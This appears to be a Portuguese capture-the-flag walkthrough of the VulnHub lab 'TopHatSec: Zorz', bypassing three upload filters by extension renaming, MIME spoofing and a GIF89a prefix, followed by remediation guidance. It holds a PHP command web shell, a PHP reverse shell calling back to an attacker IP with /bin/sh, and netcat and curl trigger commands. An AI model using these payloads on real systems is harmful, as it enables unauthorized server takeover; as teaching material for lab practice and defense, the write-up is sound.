# TopHatSec: Zorz — Três Formulários de Upload, Três Bypasses

Bora rapaziada!! Zorz é um desafio dedicado de segurança em upload de arquivo: três formulários de upload progressivamente mais difíceis, cada um com diferentes níveis de filtragem, e sua missão é bypassar todos os três e conseguir uma shell. Sem recon complexo, sem movimento lateral, só metodologia pura de bypass de upload aplicada em dificuldade crescente. Essa máquina é top demais para aprender exatamente o que separa um bom bypass de upload de uma tentativa amadora. Sensacional, mano.

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | TopHatSec: Zorz |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/tophatsec-zorz,117/ |
| **Técnicas** | Nmap, dirb, bypass de upload (renomeação de extensão, manipulação de Content-Type, prefixo de magic bytes), PHP reverse shell em cada nível do desafio |
| **CVEs** | CWE-434 (Upload Irrestrito de Arquivo com Tipo Perigoso, todos os três níveis), CWE-345 (Verificação Insuficiente de Autenticidade de Dados, bypass de tipo MIME e extensão) |
| **Grupos APT** | APT41: explora vulnerabilidades de upload de arquivo em aplicações web como vetor primário de acesso inicial; FIN7: usa técnicas de bypass de upload para implantar webshells em ataques direcionados a aplicações web |

---

## Resumo do Ataque

```
nmap → porta 80 (HTTP)
  → dirb: descobrir /uploader/ e páginas de desafio
  → Desafio 1: sem filtragem real → enviar shell.php (ou .php5)
  → Desafio 2: filtro Content-Type → alterar MIME para image/jpeg na requisição
  → Desafio 3: filtro de magic bytes → prefixar GIF89a; na shell PHP
  → todos os três → sessões netcat → www-data
```

---

## Metodologia

1. Descoberta de host e scan de portas
2. dirb para enumerar páginas de desafio de upload
3. Desafio 1: testar upload PHP básico (sem filtragem ou somente extensão)
4. Desafio 2: bypassar filtragem de Content-Type com spoofing de MIME
5. Desafio 3: bypassar verificação de magic bytes prefixando GIF89a
6. Coletar reverse shells dos três desafios

---

## Passo 1 — Descoberta de Host e Scan de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.129

nmap -sV -sC 192.168.1.129
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd
```

Único serviço HTTP. A máquina é um desafio exclusivamente web.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web

```bash
dirb http://192.168.1.129/ /usr/share/wordlists/dirb/common.txt
```

Descobrir páginas de desafio de upload:

```
/uploader/
/uploader/upload1.php   (Desafio 1)
/uploader/upload2.php   (Desafio 2)
/uploader/upload3.php   (Desafio 3)
/uploader/uploads/      (onde os arquivos ficam)
```

Cada desafio é um formulário de upload de arquivo com complexidade crescente de filtragem.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Desafio 1: Upload Básico (Sem Filtragem Real)

O Desafio 1 tem validação mínima ou inexistente do lado servidor. Enviar uma PHP reverse shell diretamente:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Editar LHOST e LPORT

# Iniciar listener
nc -lvnp 4444

# Upload de shell.php via formulário em /uploader/upload1.php
# Se .php for bloqueado, tentar:
mv shell.php shell.php5
# ou: shell.phtml, shell.pHp, shell.PHP, shell.phar
```

Após upload, disparar a shell:

```bash
curl http://192.168.1.129/uploader/uploads/shell.php
# ou shell.php5 etc.
```

Callback netcat: `www-data`.

**Nota real:** Muitos formulários de upload verificam apenas a extensão do arquivo e confiam no nome do arquivo. Renomear um arquivo PHP para `.php5` ou `.phtml` bypassa filtros de extensão baseados em blacklist em configurações Apache que não bloqueiam explicitamente essas extensões. Esse foi o bypass de upload na cadeia de exploração ProxyShell do Exchange em 2021.

**MITRE ATT&CK:** T1190 — Explorar Aplicação de Face Pública; T1505.003 — Web Shell

---

## Passo 4 — Desafio 2: Bypass de Content-Type/MIME

O Desafio 2 verifica o cabeçalho HTTP `Content-Type` do arquivo enviado. O servidor espera um tipo MIME de imagem (`image/jpeg`, `image/png`, etc.) mas não verifica o conteúdo real do arquivo.

Interceptar a requisição de upload com Burp Suite e modificar o cabeçalho Content-Type:

**Requisição original:**
```
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
```

**Requisição modificada:**
```
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
```

Ou com curl:

```bash
curl -F "file=@/tmp/shell.php;type=image/jpeg" \
  http://192.168.1.129/uploader/upload2.php
```

O servidor aceita o arquivo porque Content-Type diz que é uma imagem. O conteúdo real é PHP. Disparar:

```bash
curl http://192.168.1.129/uploader/uploads/shell.php
```

**Alternativa:** Algumas implementações verificam apenas a extensão no nome do arquivo. Tente enviar com nome `shell.php.jpg` — o servidor remove a última extensão e executa PHP se mal configurado.

**Nota real:** Validação de Content-Type é controlada pelo cliente: qualquer cliente HTTP pode enviar qualquer cabeçalho Content-Type. Validação do lado servidor deve verificar o conteúdo do arquivo, não cabeçalhos. Numerosos CVEs em CMSs (WordPress, Drupal, Joomla) exploraram exatamente esse padrão.

**MITRE ATT&CK:** T1190 — Explorar Aplicação de Face Pública; T1036 — Mascaramento

---

## Passo 5 — Desafio 3: Bypass de Magic Bytes

O Desafio 3 lê os primeiros bytes do arquivo enviado (magic bytes) para verificar se é realmente uma imagem. Magic bytes de arquivo PHP são claramente PHP, enquanto JPEG começa com `\xff\xd8\xff` e GIF começa com `GIF89a`.

Prefixar os magic bytes GIF na shell PHP:

```bash
# Método 1: Prefixar string GIF89a
echo -n "GIF89a" > /tmp/shell3.php
cat /usr/share/webshells/php/php-reverse-shell.php >> /tmp/shell3.php
# Editar LHOST e LPORT no arquivo após prefixar

# Método 2: Criar manualmente
cat > /tmp/shell3.php << 'EOF'
GIF89a
<?php
$sock = fsockopen("192.168.1.x", 4445, $errno, $errstr, 30);
$proc = proc_open("/bin/sh", [0=>$sock, 1=>$sock, 2=>$sock], $pipes);
?>
EOF
```

Enviar via formulário do Desafio 3. A verificação de magic bytes passa (vê `GIF89a`). Apache ainda executa como PHP por causa da extensão `.php`.

```bash
nc -lvnp 4445
curl http://192.168.1.129/uploader/uploads/shell3.php
```

Callback netcat: `www-data`. Desafio 3 concluído!

**Nota real:** Validação de magic bytes previne ataques ingênuos de "olhar para a extensão" mas é derrotada no momento em que o arquivo ainda tem uma extensão executável PHP. Validação verdadeira de arquivo requer: (1) verificação de magic bytes, (2) whitelist de extensão, (3) validação de tipo MIME, E (4) armazenar uploads FORA do web root. APT41 usa especificamente prefixação de magic bytes em operações de implantação de webshell.

**MITRE ATT&CK:** T1190 — Explorar Aplicação de Face Pública; T1027 — Arquivos ou Informações Ofuscadas

---

## Flags, Hashes e Credenciais Capturadas

| Desafio | Acesso | Método de Upload | Shell Como |
|---|---|---|---|
| 1 | /uploader/upload1.php | Upload PHP direto ou renomeação .php5 | www-data |
| 2 | /uploader/upload2.php | Spoofing Content-Type: image/jpeg | www-data |
| 3 | /uploader/upload3.php | Prefixo GIF89a de magic bytes | www-data |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Conclusão |
|---|---|---|---|
| 1 | Filtragem por extensão bypassada com .php5/.phtml | Filtragem baseada em blacklist é inerentemente incompleta: sempre há outra extensão para tentar | Usar whitelist de extensão (permitir apenas .jpg, .png, .gif etc.); bloquear explicitamente todas as variantes PHP na config Apache/Nginx |
| 2 | Bypass de cabeçalho Content-Type | Content-Type é controlado pelo cliente e não pode ser confiado para decisões de segurança | Ler conteúdo real do arquivo; nunca confiar em cabeçalhos para validação de tipo de arquivo |
| 3 | Bypass de magic bytes via prefixo GIF89a | Verificar apenas magic bytes é insuficiente se o arquivo ainda tem extensão PHP | A defesa requer verificações em camadas: magic bytes + whitelist de extensão + validação MIME + armazenar fora do web root |
| 4 | Todos os desafios ficam em /uploads/ dentro do web root | Mesmo com validação correta de tipo de arquivo, executar conteúdo enviado é perigoso se armazenado no web root | Armazenar todos os uploads fora do document root; usar processo separado para servir arquivos estáticos; nunca executar conteúdo enviado |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação de Face Pública | T1190 |
| Evasão de Defesa | Evasão de Defesa | Mascaramento: Spoofing de Tipo MIME | T1036 |
| Evasão de Defesa | Evasão de Defesa | Arquivos Ofuscados: Magic Bytes | T1027 |
| Persistência | Persistência | Web Shell | T1505.003 |
| Execução | Execução | Shell Unix | T1059.004 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Validar conteúdo do arquivo no servidor:** verificar magic bytes E extensão E tipo MIME; todos os três, não apenas um
2. **Usar whitelist de extensões permitidas:** permitir apenas `.jpg`, `.png`, `.gif`, `.pdf`, `.docx`; bloquear tudo mais incluindo `.php`, `.php5`, `.phtml`, `.phar`
3. **Armazenar uploads FORA do web root:** `/var/uploads/` e não `/var/www/html/uploads/`; servir via endpoint controlado
4. **Desabilitar execução PHP em diretórios de upload:** Apache: `php_admin_value engine Off` em `.htaccess` ou config do vhost do diretório de upload
5. **Usar CDN ou object storage para uploads de usuário:** S3, CloudFront ou equivalente remove completamente execução PHP do caminho de upload
6. **Renomear arquivos enviados no lado servidor:** usar nomes UUID; remover extensão original; previne disparo direto sabendo o caminho de upload

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todos os endpoints de upload de arquivo em aplicações web |
| Proteger | Controle de Acesso | Armazenar uploads fora do web root; desabilitar PHP em diretórios de upload |
| Proteger | Segurança de Dados | Validação de conteúdo: magic bytes + whitelist de extensão + MIME |
| Detectar | Anomalias e Eventos | Alertar em uploads de arquivo PHP; regras de detecção de webshell (Suricata/ModSecurity) |
| Responder | Planejamento de Resposta | Remover todas as webshells enviadas; auditar logs de upload por evidência de exploração |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| SI-10 | Validação de Entrada de Informação | Validar conteúdo do arquivo no servidor: magic bytes, extensão, MIME |
| CM-7 | Menor Funcionalidade | Desabilitar execução PHP em diretórios de upload; whitelist de tipos de arquivo |
| SC-28 | Proteção de Informação em Repouso | Armazenar uploads fora do web root; usar nomes UUID |
| AU-12 | Geração de Registro de Auditoria | Registrar todos os eventos de upload de arquivo; alertar em uploads de PHP ou script |

### CISA KEV

Upload irrestrito de arquivo (CWE-434) está consistentemente entre as principais classes de vulnerabilidades web exploradas segundo a CISA. CISA Alert AA21-131A aborda especificamente implantação de webshell via upload de arquivo como técnica top de atores de ameaça. Organizações devem tratar qualquer upload de arquivo em aplicações web como vetor potencial de RCE exigindo controles de defesa em profundidade.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Configurações de Ativos TI | MIL2 |
| Consciência Situacional (SITUATION) | Realizar Logging | MIL3 |

### MITRE D3FEND

- **D3-FV** — Validação de Arquivo (validação de conteúdo: magic bytes + extensão + MIME no servidor)
- **D3-ACH** — Hardening de Configuração de Aplicação (PHP desabilitado em diretórios de upload; armazenar fora do web root)
- **D3-OAM** — Gestão Administrativa do SO (permissões de filesystem restringindo execução de upload)

---

## Considerações Finais

Zorz é o curso de segurança de upload de arquivo que você não sabia que precisava. Três desafios, três técnicas, três lições: bypass de extensão, bypass de Content-Type, bypass de magic bytes. Cada um constrói sobre o anterior, e juntos mostram exatamente por que validação de upload de arquivo requer defesa em profundidade, não uma única verificação.

A conclusão real: não há uma única verificação que bloqueie todos os ataques de upload de arquivo. A única defesa confiável é armazenar uploads fora do web root e servi-los através de um endpoint controlado e não-executável. Todo o resto é uma camada que você pode adicionar por defesa em profundidade, não uma solução completa.

Thanks guys!! (❍ᴥ❍ʋ)
